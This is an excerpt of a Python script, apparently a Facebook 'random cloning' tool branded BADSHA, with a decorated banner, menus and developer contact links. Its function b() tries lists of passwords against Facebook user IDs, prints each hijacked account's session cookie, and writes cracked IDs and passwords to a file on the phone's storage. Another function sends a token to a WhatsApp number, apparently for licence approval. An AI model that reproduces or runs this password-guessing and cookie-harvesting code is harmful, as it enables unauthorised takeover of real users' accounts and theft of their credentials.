...
def main_apv():
    ...
    try:
        ...
        os.system('am start https://wa.me/+8801857653247?text=' + tks)

        

    r1=requests.get("https://github.com/MD BADSHA MRIDHA /RANDOM/blob/main/free.txt").text
...
logo=(""" 
 ...
 ####   #   #  ####    ###   #   #  #   #                                                     
\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
║  \x1b[97m\033[37;41m Welcome to my BADSHA Tools                          \033[0;m  ║
\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                      
\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
║  \x1b[97m\033[37;41m  FREE BANGLADESHI RANDOM CLONING V1 \033[0;m    ║
\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\33[1;92m║➣\033[1;91m DEVOLPER   :          BADSHA  \33[1;92m║               
\33[1;92m║➣ FACEBOOK   :          MD BADSHA MRIDHA \33[1;92m║                 
\33[1;92m║➣\033[1;93m WHATSAPP   :          01857653247        \33[1;92m ║
\33[1;92m║➣\033[1;34m GITHUB     :          BADSHAMRIDHA10     \33[1;92m ║          
...
def Main():
	...
	if opt in ["C","3"]:
		...
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://wa.me/+8801857653247');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
...
def admin():
	...
	if bal =='1':
		...
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100092644361679/');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mBADSHA\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [BADSHA-💚] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💙]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/BADSHA-OK💥.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
